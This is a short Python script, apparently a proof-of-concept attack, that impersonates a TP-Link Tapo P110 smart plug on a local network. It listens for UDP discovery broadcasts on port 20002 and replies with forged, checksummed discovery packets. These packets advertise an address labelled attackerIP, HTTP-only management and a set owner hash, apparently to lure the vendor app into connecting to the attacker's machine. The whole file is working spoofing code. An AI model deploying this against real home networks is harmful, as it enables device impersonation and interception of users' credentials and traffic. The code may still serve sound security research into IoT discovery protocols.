import json
from zlib import crc32
import socket

def getUDPResponse(message,random):
    """
        Constructs a UDP response packet with a specific message and random sequence number.

        Parameters:
        - message (str): The message to be included in the UDP response.
        - random (bytes): A 4-byte sequence used as a random identifier in the packet.

        Returns:
        - bytes: A byte array representing the complete UDP response packet. This includes a fixed header,
          the message content, a random sequence number, and a CRC32 checksum for integrity verification.

    """
    fixedBytes = b'\x02\x00\x00\x01\x00\x00\x11\x00\x00\x00\x00\x00Zk|\x8d'
    result = bytearray(fixedBytes + message.encode('utf-8'))
    result[4:6] = len(message).to_bytes(2, 'big')
    result[8:12] = random
    result[12:16] = crc32(result).to_bytes(4, 'big')
    return bytes(result)



attackerIP = "192.168.137.1"
OWNER="F3DC6B14E732BBB766D0F8750C2C8D9B"
localPort = 20002
bufferSize = 1024

UDPServerSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
UDPServerSocket.bind(('', localPort))
UDPServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

while (True):
    bytesAddressPair = UDPServerSocket.recvfrom(bufferSize)
    message = bytesAddressPair[0]
    address = bytesAddressPair[1]
    random=message[8:12]
    updJSONPayload={"result":{"device_id":"6447b7fc4902ab3a83f973a2767a38aa","owner":OWNER,"device_type":"SMART.TAPOPLUG","device_model":"P110(EU)","ip":attackerIP,"mac":"30-DE-4B-45-12-60","is_support_iot_cloud":False,"obd_src":"tplink","factory_default":False,"mgt_encrypt_schm":{"is_support_https":False,"encrypt_type":"AES","http_port":80,"lv":1}},"error_code":0}
    updJSONPayload=json.dumps(updJSONPayload, separators=(',', ':'))
    UDPServerSocket.sendto(getUDPResponse(updJSONPayload,random), address)
